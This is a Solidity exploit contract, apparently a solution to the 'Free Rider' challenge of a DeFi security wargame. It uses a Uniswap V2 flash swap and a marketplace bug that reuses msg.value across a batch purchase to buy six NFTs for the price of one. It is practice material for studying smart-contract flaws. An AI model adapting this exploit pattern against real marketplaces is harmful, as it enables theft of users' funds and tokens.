
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "../../contracts/free-rider/FreeRiderNFTMarketplace.sol";
// import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Router02.sol';

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, 
                           uint amount0,
                           uint amount1,
                           bytes calldata data) external;
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint wad) external;
}

contract FreeRider is IUniswapV2Callee, IERC721Receiver {
    address private attacker;
    address payable public buyerContract;
    uint256 initialBalance;
    DamnValuableNFT nft;
    FreeRiderNFTMarketplace market;
    IUniswapV2Pair pair;
    IWETH weth;

    constructor(address pairAddress, 
                address wethAddress,
                address nftAddress,
                address payable marketAddress,
                address payable buyerContractAddress) payable {
        attacker = msg.sender;
        pair = IUniswapV2Pair(pairAddress);
        weth = IWETH(wethAddress);
        market = FreeRiderNFTMarketplace(marketAddress);
        nft = DamnValuableNFT(nftAddress);
        buyerContract = buyerContractAddress;
        weth.deposit{value: address(this).balance * 9 / 10}();
    }
    
    function uniswapFlashLoanAndFreeRide() public {
        // We need 15 ETH for buying one NFT plus the fee
        uint256 borrowedWETH = 20 * (10 ** 18); // 20 ETH
        
        // weth.transferFrom(attacker, address(this), weth.balanceOf(attacker));
        initialBalance = weth.balanceOf(address(this));
        require(initialBalance != 0, "We don't have any weth!");
        weth.approve(address(pair), borrowedWETH);
        
        bytes memory data = abi.encode(borrowedWETH);
        pair.swap(
           borrowedWETH,
           0, 
           address(this),
           data
        );
    }

    function uniswapV2Call(address,
                           uint,
                           uint,
                           bytes calldata data) external override {
        // Ignore the checks here, since this contract is not for 
        //  serving.
        // address token0 = IUniswapV2Pair(msg.sender).token0();
        // address token1 = IUniswapV2Pair(msg.sender).token1();
        (uint256 borrowedAmount) = abi.decode(data, (uint256));
        require(weth.balanceOf(address(this)) == initialBalance + borrowedAmount, 
                "Not borrowing enough weth");
        require(weth.balanceOf(address(this)) > borrowedAmount, 
                "withdraw not possible"); 
        
        // We are Wealthy now!!
        
        // desiredETH + transaction fee
        // The bug of this challenge happens in the _buyOne function, which
        // use the same msg.value over all transaction. we simply have to 
        // use min([price0, price1, ...]) purchase them all.
        uint256 NFT_PRICE = 15 * (10 ** 18); 
        uint256 desiredETH = NFT_PRICE;
        uint256 amountUsed = desiredETH * 110 / 100;
        weth.withdraw(amountUsed);
        require(address(this).balance >= NFT_PRICE, "can at least buy one");
        
        // Buy all of them
        uint[] memory buyAll = new uint[](6);
        for (uint256 tokenId = 0; tokenId < 6; ++ tokenId) {
            buyAll[tokenId] = tokenId;
        } 
        market.buyMany{value: amountUsed}(buyAll);
        
        // Transfer to buyer contract 
        for (uint256 tokenId = 0; tokenId < 6; ++ tokenId) {
            nft.safeTransferFrom(nft.ownerOf(tokenId), buyerContract, tokenId);
        }
        
        // eth to weth
        weth.deposit{value: amountUsed}();
        require(weth.balanceOf(address(this)) > borrowedAmount * 101 / 100, "need to return weth");
        
        // return the money to uniswap: borrowAmount + fee
        uint256 amountReturn = borrowedAmount * 101 / 100;
        weth.transfer(msg.sender, amountReturn);
    } 
    
    function onERC721Received(
        address,
        address, 
        uint256,
        bytes memory
    ) external override pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    // able to receive ETH
    receive() external payable {}
}
